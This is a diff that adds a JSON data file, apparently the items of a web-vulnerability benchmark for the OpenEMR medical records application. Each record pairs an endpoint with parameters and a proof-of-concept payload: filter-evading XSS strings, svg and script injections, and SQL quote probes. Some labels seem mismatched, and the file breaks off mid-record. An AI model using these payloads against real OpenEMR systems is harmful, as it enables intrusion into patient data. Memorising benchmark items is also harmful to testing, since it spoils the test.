@@ -1,0 +1,3146 @@
+[
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/main_screen.php",
+    "post_data": {
+      "": [
+        "",
+        "",
+        ""
+      ],
+      "auth": [
+        "login"
+      ],
+      "authProvider": [
+        "Default"
+      ],
+      "authUser": [
+        "1998-10-11"
+      ],
+      "clearPass": [
+        "xuefeng20011024"
+      ],
+      "languageChoice": [
+        "1"
+      ],
+      "new_login_session_management": [
+        "1"
+      ],
+      "site": [
+        "default"
+      ]
+    },
+    "query_params": {
+      "auth": [
+        "login"
+      ],
+      "site": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "request_id": "requests.682870af8b21d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_00e880",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/load_compendium.php",
+    "post_data": {
+      "form_status": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "form_step": [
+        "2"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a8f850c1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_086430",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "Date": [
+        "20250331"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "pc_username[0]": [
+        "xuefeng20011024"
+      ],
+      "tplview": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.67e96a7f73509",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_0a1248",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/pending_orders.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_facility": [
+        "</title></option><script>xss(94066221)</script>"
+      ],
+      "form_from_date": [
+        "'"
+      ],
+      "form_refresh": [
+        ""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a75083ba",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_0fc49b",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681b6e87000bf",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_137a78",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/pending_orders.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "form_facility": [
+        "</title></option><script>xss(94066221)</script>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_refresh": [
+        ""
+      ],
+      "form_to_date": [
+        "\""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a74f3835",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_13bc3d",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/patient_file/encounter/superbill_custom_full.php",
+    "post_data": {
+      "active": [
+        "1"
+      ],
+      "code": [
+        "<script>xss(29234691)</script>"
+      ],
+      "code_external": [
+        "<br />\r\n<b>Notice</b>:  Undefined variable: code_external in <b>/var/www/html/interface/patient_file/encounter/superbill_custom_full.php</b> on line <b>1063</b><br />"
+      ],
+      "code_id": [
+        "0"
+      ],
+      "code_text": [
+        "<script>xss(1528994)</script>"
+      ],
+      "code_type": [
+        "1"
+      ],
+      "code_type_name_external": [
+        "<br />\r\n<b>Notice</b>:  Undefined variable: code_type_name_external in <b>/var/www/html/interface/patient_file/encounter/superbill_custom_full.php</b> on line <b>1060</b><br />"
+      ],
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "cyp_factor": [
+        "<script>xss(35693295)</script>"
+      ],
+      "fee[standard]": [
+        "<script>xss(226790)</script>"
+      ],
+      "filter[]": [
+        "1"
+      ],
+      "financial_reporting": [
+        "1"
+      ],
+      "form_superbill": [
+        ""
+      ],
+      "fstart": [
+        "0"
+      ],
+      "go": [
+        "Search"
+      ],
+      "mode": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "modifier": [
+        "<script>xss(20740346)</script>"
+      ],
+      "related_code": [
+        ""
+      ],
+      "related_desc": [
+        "<script>xss(85461203)</script>"
+      ],
+      "reportable": [
+        "1"
+      ],
+      "search": [
+        "<script>xss(19534720)</script>"
+      ],
+      "search_financial_reporting": [
+        "1"
+      ],
+      "search_reportable": [
+        "1"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a76f283e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_169e0e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/reminder/patient_reminders.php",
+    "post_data": {},
+    "query_params": {
+      "mode": [
+        "simple"
+      ],
+      "patient_id": [
+        "10,9,8'"
+      ],
+      "sortby": [
+        "lname, fname"
+      ],
+      "sortorder": [
+        "asc"
+      ]
+    },
+    "request_id": "requests.67e96a6b6d159",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_17bd6c",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/usergroup/facility_admin.php",
+    "post_data": {},
+    "query_params": {
+      "fid": [
+        "10,9,8'"
+      ]
+    },
+    "request_id": "requests.67e96a6e809f8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_1c635a",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/procedure_stats.php",
+    "post_data": {
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "form_by": [
+        "\"'><script>xss(32270077)</script>"
+      ],
+      "form_facility": [
+        "\"'><script>xss(6829106)</script>"
+      ],
+      "form_from_date": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "form_output": [
+        "\"'><script>xss(59974529)</script>"
+      ],
+      "form_sexes": [
+        "\"'><script>xss(2020399)</script>"
+      ],
+      "form_submit": [
+        "Submit"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a70873b5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_27805a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/load_compendium.php",
+    "post_data": {
+      "form_status": [
+        "Applying...<br />"
+      ],
+      "form_step": [
+        "sqli%27"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a8f8861d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_2a3b9b",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/list_reports.php",
+    "post_data": {
+      "form_external_refresh": [
+        ""
+      ],
+      "form_from_date": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "form_patient": [
+        "</title></option><script>xss(70101065)</script>"
+      ],
+      "form_provider": [
+        "</title></option><script>xss(20619352)</script>"
+      ],
+      "form_refresh": [
+        "Submit"
+      ],
+      "form_reviewed": [
+        "3"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a6de89c3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_2af21d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/procedure_stats.php",
+    "post_data": {
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "form_by": [
+        "4"
+      ],
+      "form_facility": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_output": [
+        "1"
+      ],
+      "form_sexes": [
+        "3"
+      ],
+      "form_show[]": [
+        ".tneg"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a6942c0e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_2d5571",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/controller.php",
+    "post_data": {},
+    "query_params": {
+      "document": [
+        ""
+      ],
+      "list": [
+        ""
+      ],
+      "patient_id": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ]
+    },
+    "request_id": "requests.67e96a83dc92d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_323bd7",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/super/rules/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "detail!view"
+      ],
+      "id": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67e96a86ccb97",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_333587",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/rules/patient_data.php",
+    "post_data": {},
+    "query_params": {
+      "category": [
+        "act_cat_assess"
+      ],
+      "item": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.67e96a7b25950",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_377728",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/cqm.php",
+    "post_data": {},
+    "query_params": {
+      "type": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "request_id": "requests.67e96a765dcfb",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_37ddbb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/orders_results.php",
+    "post_data": {
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_proc_type": [
+        "-1"
+      ],
+      "form_proc_type_desc": [
+        "<a href=\"\" jaekpot-attribute=\"20062005\">jaekpot</a>"
+      ],
+      "form_refresh": [
+        "Refresh"
+      ],
+      "form_to_date": [
+        "'"
+      ]
+    },
+    "query_params": {
+      "batch": [
+        "1"
+      ],
+      "review": [
+        "0"
+      ]
+    },
+    "request_id": "requests.67e96a6e8cd07",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_391dbf",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "1337"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.67e96a83c902e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_395846",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {},
+    "query_params": {
+      "show_all": [
+        "no"
+      ],
+      "sortby": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "sortorder": [
+        "asc"
+      ]
+    },
+    "request_id": "requests.67e96a6dcace4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_3976c7",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681b6e87000bf",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_3bbc54",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/printed_fee_sheet.php",
+    "post_data": {},
+    "query_params": {
+      "fill": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ]
+    },
+    "request_id": "requests.67e96a86aed79",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_3c201c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "Date": [
+        "20250517"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "pc_username": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "tplview": [
+        ""
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.681b6e876059b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_3f9b2b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.682c75aea47b9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_3fdc90",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {},
+    "query_params": {
+      "form_active": [
+        "1"
+      ],
+      "show_all": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.681b6e8468265",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_400d71",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/main_screen.php",
+    "post_data": {
+      "authProvider": [
+        "Default"
+      ],
+      "authUser": [
+        "xuefeng20011024"
+      ],
+      "clearPass": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "languageChoice": [
+        "1"
+      ],
+      "new_login_session_management": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "auth": [
+        "login"
+      ],
+      "site": [
+        "default"
+      ]
+    },
+    "request_id": "requests.67e96a73c0f19",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_432cf8",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "": [
+        "on",
+        "on",
+        ""
+      ],
+      "begin": [
+        "0"
+      ],
+      "form_active": [
+        "1"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ],
+      "task": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "query_params": {
+      "begin": [
+        "0"
+      ],
+      "form_active": [
+        "1"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ]
+    },
+    "request_id": "requests.681b6e8428508",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_43fd68",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "form_facility": [
+        ""
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_patient_id": [
+        "</title></option><script>xss(18506844)</script>"
+      ],
+      "form_patient_name": [
+        "</title></option><script>xss(23023674)</script>"
+      ],
+      "form_provider": [
+        "\""
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ],
+      "go": [
+        "Recalls"
+      ]
+    },
+    "query_params": {
+      "go": [
+        "Recalls"
+      ]
+    },
+    "request_id": "requests.67e96a6d805fd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_4873ea",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/super/rules/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.67e96a8b96da3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_4e3990",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1"
+      ],
+      "patient_id": [
+        "sqli%2527"
+      ]
+    },
+    "request_id": "requests.67e96a6ccc3fa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_519ce2",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/super/edit_layout.php",
+    "post_data": {
+      "csrf_token_form": [
+        "8d2a9b8f3d27853dfb774dddda96540fbcb01232"
+      ],
+      "deletefieldgroup": [
+        ""
+      ],
+      "deletefieldid": [
+        ""
+      ],
+      "formaction": [
+        ""
+      ],
+      "layout_id": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "movedirection": [
+        ""
+      ],
+      "movegroupname": [
+        ""
+      ],
+      "selectedfields": [
+        ""
+      ],
+      "targetgroup": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a7558b04",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_53c455",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/rules/patient_data.php",
+    "post_data": {},
+    "query_params": {
+      "category": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "item": [
+        "act_colon_cancer_screen"
+      ]
+    },
+    "request_id": "requests.67e96a7b2ab0e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_58ce9f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
